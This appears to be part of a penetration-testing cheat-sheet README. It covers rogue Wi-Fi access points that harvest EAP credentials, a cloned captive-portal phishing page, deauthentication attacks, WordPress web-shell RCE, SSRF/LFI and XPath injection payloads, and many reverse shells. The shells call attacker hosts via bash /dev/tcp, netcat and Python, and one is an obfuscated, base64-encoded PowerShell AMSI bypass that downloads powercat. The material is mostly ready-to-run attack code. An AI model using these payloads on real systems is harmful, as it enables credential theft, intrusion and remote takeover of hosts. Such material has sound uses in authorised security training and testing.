  # EAP user file we created earlier
  eap_user_file=/etc/hostapd-mana/mana.eap_user
  # Certificate paths created earlier
  ca_cert=/etc/freeradius/3.0/certs/ca.pem
  server_cert=/etc/freeradius/3.0/certs/server.pem
  private_key=/etc/freeradius/3.0/certs/server.key
  # The password is actually 'whatever'
  private_key_passwd=whatever
  dh_file=/etc/freeradius/3.0/certs/dh
  # Open authentication
  auth_algs=1
  # WPA/WPA2
  wpa=3
  # WPA Enterprise
  wpa_key_mgmt=WPA-EAP
  # Allow CCMP and TKIP
  # Note: iOS warns when network has TKIP (or WEP)
  wpa_pairwise=CCMP TKIP
  # Enable Mana WPE
  mana_wpe=1
  # Store credentials in that file
  mana_credout=/tmp/hostapd.credout
  # Send EAP success, so the client thinks it's connected
  mana_eapsuccess=1
  # EAP TLS MitM
  mana_eaptls=1
  ##EOF
  
  #HostAPd initiated
  sudo hostapd-mana /etc/hostapd-mana/mana.conf
  
  #HostAPd output with user 'cosmo' authenticating
  ..
  wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
  MANA EAP Identity Phase 1: cosmo
  MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
  MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
  MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
  ..
  
  #Running asleap on hostAPd credentials
  kali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
  asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
  Using wordlist mode with "/usr/share/john/password.lst".
          hash bytes:        586c
          NT hash:           8846f7eaee8fb117ad06bdd830b7586c
          password:          password
  
  
  #Attacking Captive Portals
  ##########################
  
  #Discovery via Airodump-ng
  sudo airodump-ng -w discovery --output-format pcap wlan0mon
  
  #Deauthenticating Clients
  sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
  
  #Building the Captive Portal
  #Installing Apache and PHP
  #Downloading MegaCorp One index page and its resources
  #Copy assets and old-site directories
  sudo apt install apache2 libapache2-mod-php
  wget -r -l2 https://www.megacorpone.com
  sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
  sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
  
  #Changing the Captive Portal login check page
  #up to -->EOF
  <?php
  # Path of the handshake PCAP
  $handshake_path = '/home/kali/discovery-01.cap';
  ..
  # Passphrase entered by the user
  $passphrase = $_POST['passphrase'];
  ..
  # Add passphrase to wordlist ...
  $wordlist_path = tempnam('/tmp', 'wordlist');
  ..
  # ... then crack the PCAP with it to see if it matches
  # If ESSID contains single quotes, they need escaping
  exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
  " -w " . $wordlist_path . " " . $handshake_path, $output, $retval);
  ..
  # Save the passphrase and redirect the user to the success page
    @rename($wordlist_path, $success_path);
  #EOF
  
  #Networking Setup
  #wlan0 IP address configuration
  #Installing dnsmasq
  sudo ip addr add 192.168.87.1/24 dev wlan0
  sudo ip link set wlan0 up
  sudo apt install dnsmasq
  
  #We will use the following mco-dnsmasq.conf configuration file for DHCP
  #Up to -->EOF
  # Main options
  # http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
  domain-needed
  bogus-priv
  no-resolv
  filterwin2k
  expand-hosts
  domain=localdomain
  local=/localdomain/
  # Only listen on this address. When specifying an
  # interface, it also listens on localhost.
  # We don't want to interrupt any local resolution
  # since the DNS responses will be spoofed
  listen-address=192.168.87.1
  # DHCP range
  dhcp-range=192.168.87.100,192.168.87.199,12h
  dhcp-lease-max=100
  # This should cover most queries
  # We can add 'log-queries' to log DNS queries
  address=/com/192.168.87.1
  address=/org/192.168.87.1
  address=/net/192.168.87.1
  
  # Entries for Windows 7 and 10 captive portal detection
  address=/dns.msftncsi.com/131.107.255.255
  #EOF
  
  #Starting dnsmasq
  sudo dnsmasq --conf-file=mco-dnsmasq.conf
  
  #Rogue AP hostapd configuration
  #Up to -->EOF
  interface=wlan0
  ssid=MegaCorp One Lab
  channel=11
  # 802.11n
  hw_mode=g
  ieee80211n=1
  # Uncomment the following lines to use OWE instead of an open network
  #wpa=2
  #ieee80211w=2
  #wpa_key_mgmt=OWE
  #rsn_pairwise=CCMP
  #EOF
  
  #Running hostapd
  sudo hostapd -B mco-hostapd.conf
  
  #Logs from hostapd and dnsmasq
  sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
  
  
  #bettercap
  ##########
  #There are a several commands in the bettercap Wi-Fi module that will be useful to us.
  #recon:1 Scan the 802.11 spectrum for APs and capture WPA/WPA2 handshakes.
  #deauth:2 Deauthenticate clients from an AP.
  #show:3 Display the discovered wireless stations.
  #ap:4 Create a rogue AP.
  
  #Installing bettercap
  sudo apt install bettercap
  
  #Starting bettercap while using wlan0
  sudo bettercap -iface wlan0
  
  #Starting the recon command
  wlan0  » wifi.recon on
  
  #Setting the channels to only 6 and 11
  wlan0  » wifi.recon.channel 6,11
  
  #Running the show Command
  wlan0  » wifi.show
  
  #Using ticker to display wireless stations
  wlan0  » set ticker.commands "clear; wifi.show"
  wlan0  » wifi.recon on
  ..
  wlan0  » ticker on
  
  #Running commands at startup
  sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
  
  #Listing clients on Corporate
  wlan0  » wifi.recon c6:2d:56:2a:53:f8
  wlan0  » wifi.show
  
  #Filtering clients connected to BSSID that start with the MAC Address "c0"
  wlan0  » set wifi.show.filter ^c0
  wlan0  » wifi.show
  
  #Listing clients on Corporate
  wlan0  » set wifi.show.filter ""
  wlan0  » set wifi.rssi.min -49
  wlan0  » wifi.show
  
  #Deauthenticating All Clients Connected to the "Corporate" AP
  wlan0  » wifi.deauth c6:2d:56:2a:53:f8
  
  #Deauthenticating a Single Client
  wlan0  » wifi.deauth ac:22:0b:28:fd:22
  
  #Changing the File and Aggregate settings
   wlan1  » wifi.recon off
   wlan1  » get wifi.handshakes.file 
    wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'
   wlan0  » set wifi.handshakes.file "/home/kali/handshakes/"
   wlan0  » set wifi.handshakes.aggregate false
   wlan0  » wifi.recon on
   wlan0  » wifi.deauth c6:2d:56:2a:53:f8
   ...
   -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /home/kali/handshakes/Corporate_405d82dcb210.pcap
  
  #Unknown BSSID during deauth
  wlan0  » wifi.deauth AA:BB:CC:DD:EE:FF
  [15:22:08] [sys.log] [err] aa:bb:cc:dd:ee:ff is an unknown BSSID, is in the deauth skip list
  
  #Deauthentication filter
  wlan0  » set wifi.deauth.skip ac:22:0b:28:fd:22
  wlan0  » wifi.deauth c6:2d:56:2a:53:f8
  wlan0  » [15:38:34] [sys.log] [inf] wifi deauthing client c0:ee:fb:1a:d8:8d 
  
  #Caplet for mass deauthentication
  kali@kali:/usr/share/bettercap/caplets$ cat -n massdeauth.cap
   1  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
  ...
  
  #Custom caplet for deauthentication
  kali@kali:~$ cat -n deauth_corp.cap 
   1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
   2
   3  set ticker.period 10
   4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
   5
   6  events.ignore wifi.ap.new
   7  events.ignore wifi.client.probe
   8  events.ignore wifi.client.new
   9
  10  wifi.recon on
  11  ticker on
  12  events.clear
  13  clear
  
  #Running custom caplet
  sudo bettercap -iface wlan0 -caplet deauth_corp.cap
  
  
  #kismet
  #######
  
  #Installing Kismet
  sudo apt install kismet
  
  #Kismet configuration files
  ls -al /etc/kismet/
  
  #Kismet configuration information
  sudo kismet -c wlan0 --no-ncurses
  
  #Running Kismet on channels 4, 5, and 6
  sudo kismet -c wlan0:channels="4,5,6"
  
  #Staring Kismet as a daemon
  sudo kismet --daemonize
  
  #Remote Capture
  #Starting a Kismet server without a data source on kali
  #Establishing an SSH tunnel with port 8000 forwarded
  #Starting a remote capture
  
  sudo kismet
  ssh kali@192.168.62.192 -L 8000:localhost:3501
  sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --source=wlan0
  
  #Log files
  #Opening a kismet file with sqlite
  sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet
  
  #sqlite one-liner
  sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet "select type, devmac from devices;"
  
  #Processing a PcapNg file with Kismet
  sudo kismet -c Documents/Network_Join_Nokia_Mobile.pcap:realtime=true
  
  #Checking datasources in a kismet file
  kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --list-datasources
  
  #Converting a kismet file to a PcapNg file
  kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --out sample.pcapng --verbose
  
  #Using kismetdb_dump_devices to create a .json file
  kismetdb_dump_devices --in /var/log/kismet/Kismet-20200917-17-45-17-1.kismet --out sample.json --skip-clean --verbose
  
  
  #Wireshark for wifi
  ###################
  
  #displaying only beacon packets by using the filter wlan.fc.type_subtype == 0x08.
  wlan.fc.type_subtype == 0x08
  
  #targeting the Mostar SSID by adding && and using the filter wlan.ssid == "Mostar".
  wlan.fc.type_subtype == 0x08 && wlan.ssid == "Mostar"
  ```

### wkhtmltopdf
- **wkhtmltopdf Example**:
  ```bash
  wkhtmltopdf http://example.com output.pdf
  ```
- **Exploit SSRF & LFI in wkhtmltopdf**:
  ```bash
  #Creating HTML File e.g. index.html:
  <iframe src="http://0.tcp.eu.ngrok.io:13264/index.php?x=/etc/passwd" width=1000px height=1000px></iframe>
  
  # Creating PHP File e.g. index.php:
  <?php header('location:file://'.$_REQUEST['x']); ?>
  
  #PHP Web Server:
  php -S 127.0.0.1:8000

  # Build tunnel
  ngrok tcp 127.0.0.1:8000
  ###Exploit SSRF via the following payload:
  http://ngrok-link:port/index.html
  e.g. http://0.tcp.eu.ngrok.io:13264/index.html
  
  ```

### WordPress (WP)
- **WordPress Example**:
  ```bash
  curl http://example.com/wp-login.php
  ```
- **Authenticated RCE via Theme Editor**:
```php
# Navigate to Appearance → Theme Editor → 404 Template
<?php echo exec("cat /home/flag.txt")?>
<?php echo system("whoami")?>
```

- **RCE via Add Plugins**:
```bash
cd /usr/share/seclists/Web-Shells/WordPress
sudo zip plugin-shell.zip plugin-shell.php 
# Upload the ZIP file and Install
```

- **Exploiting Shell via Plugin**:
```bash
# Access the shell
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php

# Generate a reverse shell payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf

# Download the payload using the RCE
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf

# Set execute permissions on the payload
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
```


### WebSocket (WS)
- **WebSocket Example**:
  ```javascript
  const socket = new WebSocket('ws://example.com/socket');
  ```
- **WebSocket XSS**:
  ```javascript
  {"message":"<img src=1 onerror='alert(1)'>"}
  {"message":"<img src=1 onerror='<img src=1 oNeRrOr=alert`1`>"}
  ```

### XPath Injection
- **XPath Injection Example**:
  ```xml
  //user[username='admin' and password='password']
  ```
- **Get all usernames**
**XPath Injection Example:**
```xml
') or 1=1 or (' 
```

- **Get Passwords**
**XPath Injection Example:**
```xml
')] | //password%00
```

- **Reveals a list of passwords**
**XPath Injection Example:**
```xml
')] | //user/*[contains(*,'password')]
```


### Other Payloads
- **PHP Reverse Shell**:
  ```php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1'"); ?>
  ```

- **Python Reverse Shell**:
  ```python
  import socket, subprocess, os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<attacker-IP>",<port>))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  subprocess.call(["/bin/sh","-i"])
  ```

---

## Shells

### Reverse Shells
- **Netcat Reverse Shell**:
  ```bash
  nc -e /bin/bash <attacker-IP> <port>
  ```

- **Python Reverse Shell**:
  ```bash
  python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker-IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.184",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
  python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.59%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27

  ```
- **Bash Reverse Shell**:
  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f 
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
  "bash -c 'bash -i >& /dev/tcp/192.168.49.121/443 0>&1'"
  bash -c 'bash -i >& /dev/tcp/192.168.49.121/443 0>&1'
  rm /tmp/f;mkfifo /tmp/f ;cat /tmp/f|/bin/sh -i 2>&1 |nc 192.168.118.4 8080  >/tmp/f --> URL Encode
  ```
- **PHP Reverse Shell**:
  ```bash
  <?php system($_GET['cmd']);?>
  <?php echo file_get_contents('/home/carlos/secret'); ?>                                                         
  <?php system("bash -i >& /dev/tcp/10.11.0.99/443 0>&1"); ?>
  <?php shell_exec("bash -i >& /dev/tcp/192.168.119.172/443 0>&1"); ?>
  <?php $sock = fsockopen("10.11.0.99",5566); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

  ```
- **Creating simple reverse shell with cat**:
  ```bash
  cat > script.sh <<EOF
  cat > script.sh <<EOF
  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.4 4445 >/tmp/f
  <tmp/f|/bin/sh -i 2>&1|nc 192.168.118.5 4445 >/tmp/f
  > EOF
  EOF
  ```
- **Powershell Reverse Shell with bypassing amsi**:
  ```bash
  [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true); iex (New-Object System.Net.WebClient).DownloadString('http://192.168.45.221/powercat.ps1'); powercat -c 192.168.45.221 -p 443 -e cmd.exe
  #decoded: -->
  $text='[Ref].Assembly.GetType("System.Management.Automation."+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),"NonPublic,Static").SetValue($null,$true);iex (New-Object System.Net.WebClient).DownloadString("http://172.16.221.77/powercat.ps1"); powercat -c 172.16.221.77 -p 4444 -e cmd.exe'
  $Bytes=[System.Text.Encoding]::Unicode.GetBytes($text)
  $EncodedText =[Convert]::ToBase64String($Bytes)
  $EncodedText
  Executing the shell: -->
  SCShell> C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -enc WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACIAKwAkACgAIgA0ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA1ADUAIAA3ADQAIAA2ADkAIAA2AEMAIAA3ADMAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAArACQAXwB9ADsAJAByAGUAcwB1AGwAdAApACkALgBHAGUAdABGAGkAZQBsAGQAKAAkACgAIgA2ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA0ADkAIAA2AEUAIAA2ADkAIAA3ADQAIAA0ADYAIAA2ADEAIAA2ADkAIAA2AEMAIAA2ADUAIAA2ADQAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0ADIAPQAkAHIAZQBzAHUAbAB0ADIAKwAkAF8AfQA7ACQAcgBlAHMAdQBsAHQAMgApACwAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAaQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADIAMgAxAC4ANwA3AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAIABwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADcAMgAuADEANgAuADIAMgAxAC4ANwA3ACAALQBwACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA

  ```

### Bind Shells
- **Netcat Bind Shell**:
  ```bash
  nc -lvnp <port> -e /bin/bash
  ```

- **Python Bind Shell**:
  ```bash
  python3 -c 'import socket,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",<port>)); s.listen(1); conn, addr = s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); os.system("/bin/sh")'
  ```

---

## Useful Resources

### Payloads and Exploits
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A comprehensive collection of payloads.
- [GTFOBins](https://gtfobins.github.io/): A curated list of Unix binaries that can be exploited by pentesters.
- [Exploit-DB](https://www.exploit-db.com/): A database of public exploits and proof-of-concepts.
- [OWASP Top 10](https://owasp.org/www-project-top-ten/): A list of the top 10 security risks.

### Pentesting Guides
- [HackTricks](https://book.hacktricks.xyz/): A handbook with tips and tricks for pentesting.
- [PentesterLab](https://www.pentesterlab.com/): A platform offering a variety of web application and pentesting exercises.
- [Hack The Box](https://www.hackthebox.eu/): A platform for pentesting challenges and exercises.

### Security Tools
- [Burp Suite](https://portswigger.net/burp): A popular web vulnerability scanner and proxy tool.
- [Nikto](https://cirt.net/Nikto2): A web server scanner to find potential vulnerabilities.
- [Wireshark](https://www.wireshark.org/): A network protocol analyzer used for packet inspection.

---

## Contributing

Contributions are welcome! If you have additional useful commands or scripts, feel free to create a pull request:

1. Fork this repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/add-new-commands
   ```
3. Commit your changes:
   ```bash
   git commit -m "Add new commands for XYZ"
   ```
4. Push to your branch:
   ```bash
   git push origin feature/add-new-commands
   ```
5. Open a pull request on GitHub.

---

## License

This project is licensed under the [MIT License](LICENSE).
